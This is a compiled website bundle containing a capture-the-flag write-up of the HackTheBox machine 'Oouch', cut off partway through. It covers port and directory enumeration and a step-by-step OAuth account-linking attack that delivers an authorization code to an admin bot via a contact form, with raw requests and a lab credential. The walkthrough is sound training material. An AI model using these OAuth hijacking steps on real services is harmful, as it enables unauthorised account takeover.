"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7990],{3905:(t,e,n)=>{n.d(e,{Zo:()=>u,kt:()=>m});var o=n(67294);function a(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function r(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(t);e&&(o=o.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,o)}return n}function i(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?r(Object(n),!0).forEach((function(e){a(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function s(t,e){if(null==t)return{};var n,o,a=function(t,e){if(null==t)return{};var n,o,a={},r=Object.keys(t);for(o=0;o<r.length;o++)n=r[o],e.indexOf(n)>=0||(a[n]=t[n]);return a}(t,e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);for(o=0;o<r.length;o++)n=r[o],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(a[n]=t[n])}return a}var p=o.createContext({}),l=function(t){var e=o.useContext(p),n=e;return t&&(n="function"==typeof t?t(e):i(i({},e),t)),n},u=function(t){var e=l(t.components);return o.createElement(p.Provider,{value:e},t.children)},c="mdxType",h={inlineCode:"code",wrapper:function(t){var e=t.children;return o.createElement(o.Fragment,{},e)}},d=o.forwardRef((function(t,e){var n=t.components,a=t.mdxType,r=t.originalType,p=t.parentName,u=s(t,["components","mdxType","originalType","parentName"]),c=l(n),d=a,m=c["".concat(p,".").concat(d)]||c[d]||h[d]||r;return n?o.createElement(m,i(i({ref:e},u),{},{components:n})):o.createElement(m,i({ref:e},u))}));function m(t,e){var n=arguments,a=e&&e.mdxType;if("string"==typeof t||a){var r=n.length,i=new Array(r);i[0]=d;var s={};for(var p in e)hasOwnProperty.call(e,p)&&(s[p]=e[p]);s.originalType=t,s[c]="string"==typeof t?t:a,i[1]=s;for(var l=2;l<r;l++)i[l]=n[l];return o.createElement.apply(null,i)}return o.createElement.apply(null,n)}d.displayName="MDXCreateElement"},91903:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>p,contentTitle:()=>i,default:()=>h,frontMatter:()=>r,metadata:()=>s,toc:()=>l});var o=n(87462),a=(n(67294),n(3905));const r={layout:"post",title:"Oouch ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb"],date:"2020/07/31",thumbnail:"/img/HackTheBox/oouch.png",toc:!0},i=void 0,s={unversionedId:"HackTheBox/Oouch/write-up",id:"HackTheBox/Oouch/write-up",title:"Oouch ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/Oouch/write-up.md",sourceDirName:"HackTheBox/Oouch",slug:"/HackTheBox/Oouch/write-up",permalink:"/writeups/HackTheBox/Oouch/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"}],version:"current",frontMatter:{layout:"post",title:"Oouch ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb"],date:"2020/07/31",thumbnail:"/img/HackTheBox/oouch.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Omni ",permalink:"/writeups/HackTheBox/Omni/write-up"},next:{title:"OpenAdmin ",permalink:"/writeups/HackTheBox/OpenAdmin/write-up"}},p={},l=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network Enumeration",id:"network-enumeration",level:3},{value:"FTP Enumeration",id:"ftp-enumeration",level:3},{value:"HTTP Discovery",id:"http-discovery",level:3},{value:"HTTP Enumeration",id:"http-enumeration",level:3},{value:"oAuth Discovery &amp; exploitation",id:"oauth-discovery--exploitation",level:3},{value:"SSRF",id:"ssrf",level:3},{value:"qtc&#39;s documents",id:"qtcs-documents",level:3},{value:"HTTP Enumeration (again)",id:"http-enumeration-again",level:3},{value:"Registering an app",id:"registering-an-app",level:3},{value:"2nd oAuth exploitation",id:"2nd-oauth-exploitation",level:3},{value:"Get qtc SSH key",id:"get-qtc-ssh-key",level:3},{value:"SSH Access with qtc",id:"ssh-access-with-qtc",level:3},{value:"Privilege Escalation : docker credential stuffing",id:"privilege-escalation--docker-credential-stuffing",level:3},{value:"UWSGI exploitation",id:"uwsgi-exploitation",level:3},{value:"DBUS Exploitation",id:"dbus-exploitation",level:3},{value:"Bonus",id:"bonus",level:3}],u={toc:l},c="wrapper";function h(t){let{components:e,...r}=t;return(0,a.kt)(c,(0,o.Z)({},u,r,{components:e,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,a.kt)("h1",{id:""}),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," Oouch"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/231"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Hard"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 40")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"oouch",src:n(83205).Z,width:"598",height:"381"})),(0,a.kt)("h1",{id:"-1"}),(0,a.kt)("h3",{id:"overview"},"Overview"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": The 1st part is a lot about oAuth and the pe part about DBus and UWSGI."),(0,a.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap filezilla ffuf burpsuite gnu-netcat\n")),(0,a.kt)("h3",{id:"network-enumeration"},"Network Enumeration"),(0,a.kt)("p",null,"Let's discover available services with a ",(0,a.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ sudo nmap -p- -sSVC 10.10.10.177 -oA nmap_full\n[sudo] password for cyfun: \nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 23:51 CEST\nWARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value\nNmap scan report for 10.10.10.177\nHost is up (0.022s latency).\nNot shown: 65531 closed ports\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 2.0.8 or later\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.15.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      Session bandwidth limit in byte/s is 30000\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)\n|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)\n5000/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n| http-title: Welcome to Oouch\n|_Requested resource was http://10.10.10.177:5000/login?next=%2F\n8000/tcp open  rtsp\n| fingerprint-strings: \n|   FourOhFourRequest, GetRequest, HTTPOptions: \n|     HTTP/1.0 400 Bad Request\n|     Content-Type: text/html\n|     Vary: Authorization\n|     <h1>Bad Request (400)</h1>\n|   RTSPRequest: \n|     RTSP/1.0 400 Bad Request\n|     Content-Type: text/html\n|     Vary: Authorization\n|     <h1>Bad Request (400)</h1>\n|   SIPOptions: \n|     SIP/2.0 400 Bad Request\n|     Content-Type: text/html\n|     Vary: Authorization\n|_    <h1>Bad Request (400)</h1>\n|_http-title: Site doesn\'t have a title (text/html).\n|_rtsp-methods: ERROR: Script execution failed (use -d to debug)\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8000-TCP:V=7.80%I=7%D=6/29%Time=5EFA626D%P=x86_64-unknown-linux-gnu\nSF:%r(GetRequest,64,"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x\nSF:20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n<h1>Bad\\x20Request\\x20\\(40\nSF:0\\)</h1>")%r(FourOhFourRequest,64,"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\nSF:\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n<h1>Bad\\x\nSF:20Request\\x20\\(400\\)</h1>")%r(HTTPOptions,64,"HTTP/1\\.0\\x20400\\x20Bad\\x\nSF:20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\nSF:\\n<h1>Bad\\x20Request\\x20\\(400\\)</h1>")%r(RTSPRequest,64,"RTSP/1\\.0\\x204\nSF:00\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authoriz\nSF:ation\\r\\n\\r\\n<h1>Bad\\x20Request\\x20\\(400\\)</h1>")%r(SIPOptions,63,"SIP/\nSF:2\\.0\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x2\nSF:0Authorization\\r\\n\\r\\n<h1>Bad\\x20Request\\x20\\(400\\)</h1>");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.42 seconds\n')),(0,a.kt)("h3",{id:"ftp-enumeration"},"FTP Enumeration"),(0,a.kt)("p",null,"Let's check the FTP anonymous access with FileZilla or ",(0,a.kt)("inlineCode",{parentName:"p"},"ftp")," CLI command:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ftp 10.10.10.177\nConnected to 10.10.10.177.\n220 qtc's development server\nName (10.10.10.177:cyfun): anonymous\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt\n226 Directory send OK.\n")),(0,a.kt)("p",null,"Only one file, ",(0,a.kt)("inlineCode",{parentName:"p"},"project.txt"),", we can't miss it:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cat project.txt\nFlask -> Consumer\nDjango -> Authorization Server\n")),(0,a.kt)("p",null,"It seems we will encounter a python web server in the next steps."),(0,a.kt)("h3",{id:"http-discovery"},"HTTP Discovery"),(0,a.kt)("p",null,"Then we have a web application on port 5000: ",(0,a.kt)("a",{parentName:"p",href:"http://10.10.10.177:5000/"},"http://10.10.10.177:5000/")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/l2oRua1.png",alt:null})),(0,a.kt)("p",null,"There are a login and a register form, so let's register to see what's behind."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/fK347aD.png",alt:null})),(0,a.kt)("p",null,"We quickly check the menu entries but there is nothing interesting."),(0,a.kt)("p",null,"The only action we can do is send a message on the contact page."),(0,a.kt)("h3",{id:"http-enumeration"},"HTTP Enumeration"),(0,a.kt)("p",null,"We'll use ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf")," for directory busting:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ffuf -u http://10.10.10.177:5000/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.177:5000/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\nabout                   [Status: 200, Size: 1828, Words: 414, Lines: 55]\ncontact                 [Status: 200, Size: 1828, Words: 414, Lines: 55]\ndocuments               [Status: 200, Size: 1828, Words: 414, Lines: 55]\nhome                    [Status: 200, Size: 1828, Words: 414, Lines: 55]\nlogout                  [Status: 200, Size: 1828, Words: 414, Lines: 55]\nlogin                   [Status: 200, Size: 1828, Words: 414, Lines: 55]\noauth                   [Status: 200, Size: 1828, Words: 414, Lines: 55]\nprofile                 [Status: 200, Size: 1828, Words: 414, Lines: 55]\nregister                [Status: 200, Size: 2109, Words: 517, Lines: 64]\n:: Progress: [4658/4658]\xa0:: Job [1/1] :: 388 req/sec :: Duration: [0:00:12] :: Errors: 0 ::\n")),(0,a.kt)("p",null,"The only endpoint that not linked in the menu is ",(0,a.kt)("inlineCode",{parentName:"p"},"oauth"),"."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/p3xW5q8.png",alt:null})),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"Please notice: This functionality is currently under development and not ready to be used in production. However, since you know about this hidden URL, it seems that you got developer access and are supposed to use it."),(0,a.kt)("p",{parentName:"blockquote"},"In order to connect your account with our Oouch authorization server, please visit:\n",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/oauth/connect"},"http://consumer.oouch.htb:5000/oauth/connect")),(0,a.kt)("p",{parentName:"blockquote"},"Once your account is connected, you should be able to use the authorization server for login. Just visit:\n",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/oauth/login"},"http://consumer.oouch.htb:5000/oauth/login"))),(0,a.kt)("p",null,"Before digging deeper the oAuth process I'll add the domain names in ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/hosts"),"\nas a domain name may be required:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"10.10.10.177 oouch.htb\n10.10.10.177 consumer.oouch.htb\n10.10.10.177 authorization.oouch.htb\n")),(0,a.kt)("p",null,"If we go to ",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/oauth/connect"},"http://consumer.oouch.htb:5000/oauth/connect")," and login we are\nredirected several times to end here: ",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/login/"},"http://authorization.oouch.htb:8000/login/")),(0,a.kt)("p",null,"So as we saw in ",(0,a.kt)("inlineCode",{parentName:"p"},"project.txt"),", we must have the following logic:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Flask -> Consumer -> consumer.oouch.htb:5000"),(0,a.kt)("li",{parentName:"ul"},"Django -> Authorization Server -> authorization.oouch.htb:8000")),(0,a.kt)("h3",{id:"oauth-discovery--exploitation"},"oAuth Discovery & exploitation"),(0,a.kt)("p",null,"From here I'll have to learn about how oAuth works."),(0,a.kt)("p",null,"There are plenty resources to explain security flaws in oAuth, we will look how\nto perform a ",(0,a.kt)("em",{parentName:"p"},"Session Fixation Attack on oAuth"),":"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://www.sans.org/reading-room/whitepapers/application/attacks-oauth-secure-oauth-implementation-33644"},"2020 - SANS (InstituteInformation Security Reading Room) - Four Attacks on OAuth, How to Secure Your OAuthImplementation by Khash Kiani")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://owasp.org/www-pdf-archive/OWASP-NL_Chapter_Meeting201501015_OAuth_Jim_Manico.pdf"},"2015 - OWASP (NL Chapter Meeting 2015-01-15) - OAuth by Jim_Manico")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/"},"2017 - Attacking the OAuth Protocol by Dhaval Kapil"))),(0,a.kt)("p",null,"So we will have to conduct an attack following those steps (we will need a proxy like ",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/burp"},"Burp"),"):"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The victim (admin) is logged in at consumer site (htpp://consumer.oouch.htb:5000) (The oAuth client application)")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker (us) register an account at consumer site (",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/register"},"http://consumer.oouch.htb:5000/register"),")")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker register an account at the provider site (",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/signup/"},"http://authorization.oouch.htb:8000/signup/"),")")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker login at the provider site to speed-up the process (",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/login/"},"http://authorization.oouch.htb:8000/login/"),")")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker start login locally at consumer site (",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/login"},"http://consumer.oouch.htb:5000/login"),") ")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker goes to the oAuth login page (",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/oauth"},"http://consumer.oouch.htb:5000/oauth"),")")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker start the connection process:"),(0,a.kt)("ol",{parentName:"li"},(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker send the connect request"),(0,a.kt)("pre",{parentName:"li"},(0,a.kt)("code",{parentName:"pre"},"GET /oauth/connect HTTP/1.1\nHost: consumer.oouch.htb:5000\n...\n"))),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"Consumer Site redirects attacker to Provider Site to authorize the consumer site to use the provider site account (the oAuth authorization) (",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/oauth/authorize/"},"http://authorization.oouch.htb:8000/oauth/authorize/"),")"),(0,a.kt)("pre",{parentName:"li"},(0,a.kt)("code",{parentName:"pre"},"GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1\nHost: authorization.oouch.htb:8000\n...\n"))),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker confirms the authorization by clicking the Authorize button (",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/oauth/authorize/"},"http://authorization.oouch.htb:8000/oauth/authorize/"),")"),(0,a.kt)("pre",{parentName:"li"},(0,a.kt)("code",{parentName:"pre"},"POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1\nHost: authorization.oouch.htb:8000\n...\n\ncsrfmiddlewaretoken=VoAxj1ao7mvIrvJDGPCTyB2x6Rq6KEwWWeFwFjEjArMsd2UkWwry6m8hxn737ia2&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize\n")),(0,a.kt)("p",{parentName:"li"},(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/0DNEDdp.png",alt:null}))),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The provider site responds with the redirect URL which contains the authorization code in the code parameter (Authorization Grant)"),(0,a.kt)("pre",{parentName:"li"},(0,a.kt)("code",{parentName:"pre"},"GET /oauth/connect/token?code=Srwh8xkKLMf1VDre8HmqGieVQ1aY1C HTTP/1.1\nHost: consumer.oouch.htb:5000\n...\n"))),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"Here, the attacker ",(0,a.kt)("strong",{parentName:"p"},"DOES NOT")," follow the redirection (",(0,a.kt)("em",{parentName:"p"},"Drop")," instead of ",(0,a.kt)("em",{parentName:"p"},"Forward")," in Burp).")))),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"Instead the attacker copies the Authorization Grant URL and send it to the administrator via the contact form (pseudo-SSRF that we'll see just after)."),(0,a.kt)("pre",{parentName:"li"},(0,a.kt)("code",{parentName:"pre"},"POST /contact HTTP/1.1\nHost: oouch.htb:5000\n...\n\ncsrf_token=IjQ0ZTk3YTcxZTJkMTUzMjdkODBmZWJlOTk3MWVhNjFlNDQ3YThkMTIi.XvuH3Q.BYECgUUU9-nRB3hYE9dOPPi_4dA&textfield=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken%3Fcode%3DSrwh8xkKLMf1VDre8HmqGieVQ1aY1C&submit=Send\n"))),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The victim follows the link and requests the Authorization Grant URL, and by doing so gives authorization to the Attacker to have full authorized access to Victim's account on Consumer Site.")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker waits a minute and goes back to the oAuth connect URL (",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/oauth/login"},"http://consumer.oouch.htb:5000/oauth/login"),") and Authorize.")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("p",{parentName:"li"},"The attacker goes back to the profile page on consumer site and checks the account username is now ",(0,a.kt)("inlineCode",{parentName:"p"},"qtc"),".\n",(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/Fq2UGfd.png",alt:null})))),(0,a.kt)("h3",{id:"ssrf"},"SSRF"),(0,a.kt)("p",null,"If you paste an URL in the contact form, someone will click on it (a bot).\nSo this gives us a pseudo-SSRF (in a phishing way)."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/fb8jU8m.png",alt:null})),(0,a.kt)("p",null,"Here the web server receiving the bot visit 1 minute after the message was sent."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ ruby -run -e httpd share -p 8000\n[2020-06-30 19:09:57] INFO  WEBrick 1.6.0\n[2020-06-30 19:09:57] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]\n[2020-06-30 19:09:57] INFO  WEBrick::HTTPServer#start: pid=55191 port=8000\n[2020-06-30 19:12:21] ERROR `/\' not found.\n10.10.10.177 - - [30/Jun/2020:19:12:21 CEST] "GET / HTTP/1.1" 404 273\n- -> /\n')),(0,a.kt)("p",null,"So we used this SSRF to send the Authorization Grant URL to the victim."),(0,a.kt)("h3",{id:"qtcs-documents"},"qtc's documents"),(0,a.kt)("p",null,"Now that we are logged in as ",(0,a.kt)("inlineCode",{parentName:"p"},"qtc")," (admin) we can access the document endpoint (",(0,a.kt)("a",{parentName:"p",href:"http://consumer.oouch.htb:5000/documents"},"http://consumer.oouch.htb:5000/documents"),")."),(0,a.kt)("table",null,(0,a.kt)("thead",{parentName:"table"},(0,a.kt)("tr",{parentName:"thead"},(0,a.kt)("th",{parentName:"tr",align:null},"Filename"),(0,a.kt)("th",{parentName:"tr",align:null},"Content"))),(0,a.kt)("tbody",{parentName:"table"},(0,a.kt)("tr",{parentName:"tbody"},(0,a.kt)("td",{parentName:"tr",align:null},"dev_access.txt"),(0,a.kt)("td",{parentName:"tr",align:null},"develop:supermegasecureklarabubu123! -> Allows application registration.")),(0,a.kt)("tr",{parentName:"tbody"},(0,a.kt)("td",{parentName:"tr",align:null},"o_auth_notes.txt"),(0,a.kt)("td",{parentName:"tr",align:null},"/api/get_user -> user data. oauth/authorize -> Now also supports GET method.")),(0,a.kt)("tr",{parentName:"tbody"},(0,a.kt)("td",{parentName:"tr",align:null},"todo.txt"),(0,a.kt)("td",{parentName:"tr",align:null},"Chris mentioned all users could obtain my ssh key. Must be a joke...")))),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/Emawg6x.png",alt:null})),(0,a.kt)("p",null,"Knowledge from the documents:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Credentials to register an app"),(0,a.kt)("li",{parentName:"ul"},"There is api to access user data"),(0,a.kt)("li",{parentName:"ul"},"The ssh key of ",(0,a.kt)("inlineCode",{parentName:"li"},"qtc")," should be available somewhere")),(0,a.kt)("h3",{id:"http-enumeration-again"},"HTTP Enumeration (again)"),(0,a.kt)("p",null,"There must be an endpoint to register an application as said in ",(0,a.kt)("inlineCode",{parentName:"p"},"dev_access.txt"),"."),(0,a.kt)("p",null,"Let's use ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf")," to find it, rather straightforward:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ffuf -u http://authorization.oouch.htb:8000/oauth/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://authorization.oouch.htb:8000/oauth/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\napplications            [Status: 401, Size: 0, Words: 1, Lines: 1]\n:: Progress: [4658/4658]\xa0:: Job [1/1] :: 258 req/sec :: Duration: [0:00:18] :: Errors: 0 ::\n\n$ ffuf -u http://authorization.oouch.htb:8000/oauth/applications/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://authorization.oouch.htb:8000/oauth/applications/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\n...\nregister                [Status: 401, Size: 0, Words: 1, Lines: 1]\n:: Progress: [4658/4658]\xa0:: Job [1/1] :: 194 req/sec :: Duration: [0:00:24] :: Errors: 0 ::\n")),(0,a.kt)("p",null,"So we should be able to register an app at ",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/oauth/applications/register"},"http://authorization.oouch.htb:8000/oauth/applications/register")),(0,a.kt)("h3",{id:"registering-an-app"},"Registering an app"),(0,a.kt)("p",null,"Go at ",(0,a.kt)("a",{parentName:"p",href:"http://authorization.oouch.htb:8000/oauth/applications/register"},"http://authorization.oouch.htb:8000/oauth/applications/register")),(0,a.kt)("p",null,"We are prompted for credentials (",(0,a.kt)("em",{parentName:"p"},"Oouch Development"),"):"),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/dbcEKxe.png",alt:null})),(0,a.kt)("p",null,"Let's use 